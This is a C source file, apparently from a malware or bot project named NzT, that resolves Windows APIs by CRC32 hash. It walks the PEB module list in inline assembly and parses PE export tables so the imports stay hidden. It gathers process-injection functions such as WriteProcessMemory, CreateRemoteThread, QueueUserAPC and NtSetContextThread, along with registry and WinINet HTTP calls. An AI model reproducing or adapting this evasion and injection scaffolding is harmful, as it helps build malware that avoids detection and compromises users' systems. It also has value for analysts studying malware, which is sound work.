#ifdef _DEBUG
#include <stdio.h>
#endif

#include "api.h"
#include "utils.h"
#include "nzt.h"
#include "ntdll.h"

//implement heavens gate to handle x86<->x64 dynamic function resolving
HMODULE GetModuleHandleByHash(DWORD Hash)
{
	LDR_MODULE* Module = NULL;
	DWORD CurrentHash;
	DWORD Length;

	_asm
	{
		MOV EAX, FS:[0x18];
		MOV EAX, [EAX + 0x30];
		MOV EAX, [EAX + 0x0C];
		MOV EAX, [EAX + 0x0C];
		MOV Module, EAX;
	}

	while (Module->BaseAddress)
	{
		LPWSTR LowerCase = StringToLowerW(Module->BaseDllName.Buffer, Module->BaseDllName.Length);
		
		Length	    = StringLengthW(LowerCase) * 2;
		CurrentHash = Crc32Hash(LowerCase, Length);

		if (CurrentHash == Hash)
		{
			return (HMODULE)Module->BaseAddress;
		}

		Module = (PLDR_MODULE)(struct ModuleInfoNode*)Module->InLoadOrderModuleList.Flink;
	}

	return (HMODULE)NULL;
}

BOOL GetModules()
{
	DWORD i;

	API_MODULE ModuleList[] =
	{
		{HASH_KERNEL32, &NzT.Modules.Kernel32}
	};

	for (i = 0; i < sizeof(ModuleList) / sizeof(API_MODULE); i++)
	{
		if ((*ModuleList[i].Module = GetModuleHandleByHash(ModuleList[i].ModuleHash)) == 0)
		{
			return FALSE;
		}
	}

	return TRUE;
}

BOOL LoadNtdllModule()
{
	API_MODULE ModuleList[] =
	{
		{HASH_NTDLL, &NzT.Modules.Ntdll}
	};

	for (DWORD i = 0; i < sizeof(ModuleList) / sizeof(API_MODULE); i++)
	{
		if ((*ModuleList[i].Module = GetModuleHandleByHash(ModuleList[i].ModuleHash)) == 0)
		{
			return FALSE;
		}
	}

	return TRUE;
}

BOOL LoadNtdll()
{
	API_T ApiList[] =
	{
		{HASH_NTDLL_RTLGETVERSION, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pRtlGetVersion},
		{HASH_NTDLL_NTCREATETHREAD,	&NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtCreateThread},
		{HASH_NTDLL_NTQUERYINFORMATIONPROCESS, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtQueryInformationProcess},
		{HASH_NTDLL_NTQUERYINFORMATIONTHREAD, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtQueryInformationThread},
		{HASH_NTDLL_NTCREATEUSERPROCESS, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtCreateUserProcess},
		{HASH_NTDLL_NTMAPVIEWOFSECTION, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtMapViewOfSection},
		{HASH_NTDLL_NTCREATESECTION, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtCreateSection},
		{HASH_NTDLL_LDRLOADDLL, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pLdrLoadDll},
		{HASH_NTDLL_LDRGETDLLHANDLE, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pLdrGetDllHandle},
		{HASH_NTDLL_NTWRITEVIRTUALMEMORY, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtWriteVirtualMemory},
		{HASH_NTDLL_NTALLOCATEVIRTUALMEMORY, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtAllocateVirtualMemory},
		{HASH_NTDLL_NTPROTECTVIRTUALMEMORY, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtProtectVirtualMemory},
		{HASH_NTDLL_NTDEVICEIOCONTROLFILE, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtDeviceIoControlFile},
		{HASH_NTDLL_NTSETCONTEXTTHREAD, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtSetContextThread},
		{HASH_NTDLL_NTOPENPROCESS, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtOpenProcess},
		{HASH_NTDLL_NTCLOSE, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtClose},
		{HASH_NTDLL_NTCREATEFILE, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtCreateFile},
		{HASH_NTDLL_NTOPENFILE, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtOpenFile},
		{HASH_NTDLL_NTDELETEFILE, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtDeleteFile},
		{HASH_NTDLL_NTREADVIRTUALMEMORY, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtReadVirtualMemory},
		{HASH_NTDLL_NTQUERYVIRTUALMEMORY, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtQueryVirtualMemory},
		{HASH_NTDLL_NTOPENTHREAD, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtOpenThread},
		{HASH_NTDLL_NTRESUMETHREAD, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtResumeThread},
		{HASH_NTDLL_NTFREEVIRTUALMEMORY, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtFreeVirtualMemory},
		{HASH_NTDLL_NTFLUSHINSTRUCTIONCACHE, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtFlushInstructionCache},
		{HASH_NTDLL_RTLRANDOMEX, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pRtlRandomEx},
		{HASH_NTDLL_NTQUERYSYSTEMINFORMATION, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtQuerySystemInformation},
		{HASH_NTDLL_LDRQUERYPROCESSMODULEINFORMATION, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pLdrQueryProcessModuleInformation},
		{HASH_NTDLL_RTLINITUNICODESTRING, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pRtlInitUnicodeString},
		{HASH_NTDLL_NTWRITEFILE, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtWriteFile},
		{HASH_NTDLL_NTREADFILE, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtReadFile},
		{HASH_NTDLL_NTDELAYEXECUTION, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtDelayExecution},
		{HASH_NTDLL_NTOPENKEY, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtOpenKey},
		{HASH_NTDLL_NTSETVALUEKEY, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtSetValueKey},
		{HASH_NTDLL_NTQUERYVALUEKEY, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtQueryValueKey},
		{HASH_NTDLL_RTLFORMATCURRENTUSERKEYPATH, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pRtlFormatCurrentUserKeyPath},
		{HASH_NTDLL_NTQUERYINFORMATIONFILE, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pNtQueryInformationFile}
	};

	for (DWORD i = 0; i < sizeof(ApiList) / sizeof(API_T); i++)
	{
		*ApiList[i].Function = GetProcAddressByHash(*ApiList[i].Module, ApiList[i].FunctionHash);
	}

	return TRUE;
}


HMODULE LoadLibraryByHash(DWORD Hash){
	LPWSTR SystemDirectory;
	WIN32_FIND_DATAW Data;
	HANDLE File;
	DWORD CurrentHash;
	HMODULE Module;

	if ((SystemDirectory = GetSystem32()) == NULL)
		return 0;

	if (!StringConcatW(&SystemDirectory, L"\\*.dll"))
		return 0;

	Module = 0;

	MemoryZero(&Data, sizeof(WIN32_FIND_DATAW));

	if ((File = API(FindFirstFileW(SystemDirectory, &Data))) != INVALID_HANDLE_VALUE)
	{
		while (TRUE)
		{
			if (!API(FindNextFileW(File, &Data)))
				break;

			if (File == INVALID_HANDLE_VALUE)
				break;

			CurrentHash = Crc32Hash(Data.cFileName, StringLengthW(Data.cFileName) * 2);

			if (CurrentHash == Hash)
			{
				Module = API(LoadLibraryW(Data.cFileName));
				break;
			}
		}
	}

	Free(SystemDirectory);
	return Module;
}

LPVOID GetProcAddressByHash(
	HMODULE Module,
	DWORD Hash
)
{
#if defined _WIN64
	PIMAGE_NT_HEADERS64 NtHeaders;
#else
	PIMAGE_NT_HEADERS32 NtHeaders;
#endif

	PIMAGE_DATA_DIRECTORY	DataDirectory;
	PIMAGE_EXPORT_DIRECTORY ExportDirectory;

	LPDWORD Name;
	DWORD	i, CurrentHash;
	LPSTR   Function;
	LPWORD  pw;

	if (Module == NULL)
		return NULL;

#if defined _WIN64
	NtHeaders = (PIMAGE_NT_HEADERS64)((LPBYTE)Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew);
#else
	NtHeaders = (PIMAGE_NT_HEADERS32)((LPBYTE)Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew);
#endif

	DataDirectory	= &NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)Module + DataDirectory->VirtualAddress);

	for (i = 0; i < ExportDirectory->NumberOfNames; i++)
	{
		Name	 = (LPDWORD)(((LPBYTE)Module) + ExportDirectory->AddressOfNames + i * sizeof(DWORD));
		Function = (LPSTR)((LPBYTE)Module + *Name);

		CurrentHash = Crc32Hash(Function, StringLengthA(Function));

		if (Name && Function && CurrentHash == Hash)
		{
			pw   = (LPWORD)(((LPBYTE)Module) + ExportDirectory->AddressOfNameOrdinals + i * sizeof(WORD));
			Name = (LPDWORD)(((LPBYTE)Module) + ExportDirectory->AddressOfFunctions + (*pw) * sizeof(DWORD));
			return ((LPBYTE)Module + *Name);
		}
	}

	return NULL;
}

BOOL LoadModules()
{
	API_MODULE ModuleList[] = 
	{
		{HASH_USER32, &NzT.Modules.User32},
		{HASH_WININET, &NzT.Modules.Wininet},
		{HASH_SHELL32, &NzT.Modules.Shell32},
		{HASH_ADVAPI32, &NzT.Modules.Advapi32}
	};

	for (DWORD i = 0; i < sizeof(ModuleList) / sizeof(API_MODULE); i++)
	{
		if ((*ModuleList[i].Module = LoadLibraryByHash(ModuleList[i].ModuleHash)) == 0)
			return FALSE;
	}

	return TRUE;
}

BOOL LoadKernel32()
{
	API_T ApiList[] =
	{
		{ HASH_KERNEL32_VIRTUALALLOC, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pVirtualAlloc },
		{HASH_KERNEL32_VIRTUALFREE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pVirtualFree },
		{HASH_KERNEL32_WRITEPROCESSMEMORY, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pWriteProcessMemory },
		{HASH_KERNEL32_CREATETOOLHELP32SNAPSHOT, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pCreateToolhelp32Snapshot },
		{HASH_KERNEL32_VIRTUALALLOCEX, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pVirtualAllocEx },
		{HASH_KERNEL32_VIRTUALFREEEX, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pVirtualFreeEx },
		{HASH_KERNEL32_PROCESS32FIRSTW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pProcess32FirstW },
		{HASH_KERNEL32_PROCESS32NEXTW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pProcess32NextW },
		{HASH_KERNEL32_CLOSEHANDLE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pCloseHandle },
		{HASH_KERNEL32_CREATEPROCESSW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pCreateProcessW },
		{HASH_KERNEL32_VIRTUALPROTECT, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pVirtualProtect },
		{HASH_KERNEL32_OPENPROCESS, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pOpenProcess },
		{HASH_KERNEL32_CREATEREMOTETHREAD, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pCreateRemoteThread },
		{HASH_KERNEL32_EXITPROCESS, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pExitProcess },
		{HASH_KERNEL32_GETMODULEFILENAMEW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetModuleFileNameW },
		{HASH_KERNEL32_DELETEFILEW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pDeleteFileW },
		{HASH_KERNEL32_LOADLIBRARYW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pLoadLibraryW },
		{HASH_KERNEL32_ISWOW64PROCESS, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pIsWow64Process },
		{HASH_KERNEL32_GETWINDOWSDIRECTORYW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetWindowsDirectoryW },
		{HASH_KERNEL32_QUEUEUSERAPC, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pQueueUserAPC },
		{HASH_KERNEL32_RESUMETHREAD, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pResumeThread },
		{HASH_KERNEL32_GETSYSTEMDIRECTORYW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetSystemDirectoryW },
		{HASH_KERNEL32_FINDFIRSTFILEW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pFindFirstFileW },
		{HASH_KERNEL32_FINDNEXTFILEW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pFindNextFileW },
		{HASH_KERNEL32_CREATETHREAD, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pCreateThread},
		{HASH_KERNEL32_CREATEFILEW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pCreateFileW},
		{HASH_KERNEL32_WRITEFILE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pWriteFile},
		{HASH_KERNEL32_READFILE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pReadFile},
		{HASH_KERNEL32_GETFILESIZE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetFileSize},
		{HASH_KERNEL32_GETVERSIONEXW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetVersionExW},
		{HASH_KERNEL32_FINDFIRSTVOLUMEW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pFindFirstVolumeW},
		{HASH_KERNEL32_GETVOLUMEINFORMATIONW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetVolumeInformationW},
		{HASH_KERNEL32_FINDVOLUMECLOSE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pFindVolumeClose},
		{HASH_KERNEL32_MULTIBYTETOWIDECHAR, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pMultiByteToWideChar},
		{HASH_KERNEL32_GETMODULEHANDLEW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetModuleHandleW},
		{HASH_KERNEL32_FLUSHINSTRUCTIONCACHE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pFlushInstructionCache},
		{HASH_KERNEL32_GETCURRENTPROCESS, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetCurrentProcess},
		{HASH_KERNEL32_THREAD32FIRST, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pThread32First},
		{HASH_KERNEL32_THREAD32NEXT, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pThread32Next},
		{HASH_KERNEL32_OPENMUTEXW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pOpenMutexW},
		{HASH_KERNEL32_CREATEMUTEXW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pCreateMutexW},
		{HASH_KERNEL32_VIRTUALQUERY, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pVirtualQuery},
		{HASH_KERNEL32_GETCURRENTPROCESSID, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetCurrentProcessId},
		{HASH_KERNEL32_CREATEFILEMAPPINGW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pCreateFileMappingW},
		{HASH_KERNEL32_MAPVIEWOFFILE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pMapViewOfFile},
		{HASH_KERNEL32_UNMAPVIEWOFFILE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pUnmapViewOfFile},
		{HASH_KERNEL32_DUPLICATEHANDLE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pDuplicateHandle},
		{HASH_KERNEL32_GETCURRENTTHREAD, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetCurrentThread},
		{HASH_KERNEL32_FLUSHFILEBUFFERS, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pFlushFileBuffers},
		{HASH_KERNEL32_DISCONNECTNAMEDPIPE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pDisconnectNamedPipe},
		{HASH_KERNEL32_GETPROCADDRESS, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetProcAddress},
		{HASH_KERNEL32_RTLINITIALIZECRITICALSECTION, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pRtlInitializeCriticalSection},
		{HASH_KERNEL32_RTLENTERCRITICALSECTION, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pRtlEnterCriticalSection},
		{HASH_KERNEL32_WIDECHARTOMULTIBYTE, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pWideCharToMultiByte},
		{HASH_KERNEL32_RTLLEAVECRITICALSECTION, &NzT.Modules.Ntdll, (LPVOID*)&NzT.Api.pRtlLeaveCriticalSection},
		{HASH_KERNEL32_TERMINATETHREAD, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pTerminateThread},
		{HASH_KERNEL32_GETTICKCOUNT, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetTickCount},
		{HASH_KERNEL32_OUTPUTDEBUGSTRINGA, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pOutputDebugStringA},
		{HASH_KERNEL32_OUTPUTDEBUGSTRINGW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pOutputDebugStringW},
		{HASH_KERNEL32_GETLASTERROR, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pGetLastError},
		{HASH_KERNEL32_SETEVENT, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pSetEvent},
		{HASH_KERNEL32_CREATEEVENTA, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pCreateEventA},
		{HASH_KERNEL32_CREATEEVENTW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pCreateEventW},
		{HASH_KERNEL32_OPENEVENTA, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pOpenEventA},
		{HASH_KERNEL32_OPENEVENTW, &NzT.Modules.Kernel32, (LPVOID*)&NzT.Api.pOpenEventW}
	};

	for (DWORD i = 0; i < sizeof(ApiList) / sizeof(API_T); i++)
		if ((*ApiList[i].Function = GetProcAddressByHash(*ApiList[i].Module, ApiList[i].FunctionHash)) == NULL)
			return FALSE;

	return TRUE;
}

BOOL LoadFunctions()
{
	API_T ApiList[] = 
	{
		{HASH_USER32_MESSAGEBOXA, &NzT.Modules.User32, (LPVOID*)&NzT.Api.pMessageBoxA},
		{HASH_USER32_WSPRINTFW, &NzT.Modules.User32, (LPVOID*)&NzT.Api.pwsprintfW},
		{ HASH_USER32_WSPRINTFA, &NzT.Modules.User32, (LPVOID*)&NzT.Api.pwsprintfA},
		{HASH_WININET_INTERNETOPENW, &NzT.Modules.Wininet, (LPVOID*)&NzT.Api.pInternetOpenW},
		{HASH_WININET_INTERNETCONNECTA, &NzT.Modules.Wininet, (LPVOID*)&NzT.Api.pInternetConnectA},
		//{HASH_WININET_INTERNETCONNECTW, &NzT.Modules.Wininet, (LPVOID*)&NzT.Api.pInternetConnectW},
		{HASH_WININET_HTTPOPENREQUESTA, &NzT.Modules.Wininet, (LPVOID*)&NzT.Api.pHttpOpenRequestA},
		//{HASH_WININET_HTTPOPENREQUESTW, &NzT.Modules.Wininet, (LPVOID*)&NzT.Api.pHttpOpenRequestW},
		{HASH_WININET_HTTPSENDREQUESTA, &NzT.Modules.Wininet, (LPVOID*)&NzT.Api.pHttpSendRequestA},
		//{HASH_WININET_HTTPSENDREQUESTW, &NzT.Modules.Wininet, (LPVOID*)&NzT.Api.pHttpSendRequestW},
		{HASH_WININET_INTERNETREADFILE, &NzT.Modules.Wininet, (LPVOID*)&NzT.Api.pInternetReadFile},
		{HASH_WININET_INTERNETCLOSEHANDLE, &NzT.Modules.Wininet, (LPVOID*)&NzT.Api.pInternetCloseHandle},
		{HASH_SHELL32_SHGETFOLDERPATHW, &NzT.Modules.Shell32, (LPVOID*)&NzT.Api.pSHGetFolderPathW},
		{HASH_ADVAPI32_GETUSERNAMEA, &NzT.Modules.Advapi32, (LPVOID*)&NzT.Api.pGetUserNameA},
		{HASH_USER32_GETCURSORPOS, &NzT.Modules.User32, (LPVOID*)&NzT.Api.pGetCursorPos}
	};

	for (DWORD i = 0; i < sizeof(ApiList) / sizeof(API_T); i++)
		if ((*ApiList[i].Function = GetProcAddressByHash(*ApiList[i].Module, ApiList[i].FunctionHash)) == NULL)
			return FALSE;

	return TRUE;
}

BOOL ApiInitialize()
{
	if (GetModules())
		if (LoadNtdllModule())
			if (LoadNtdll())
				if (LoadKernel32())
					if (LoadModules())
						return LoadFunctions();
	return FALSE;
}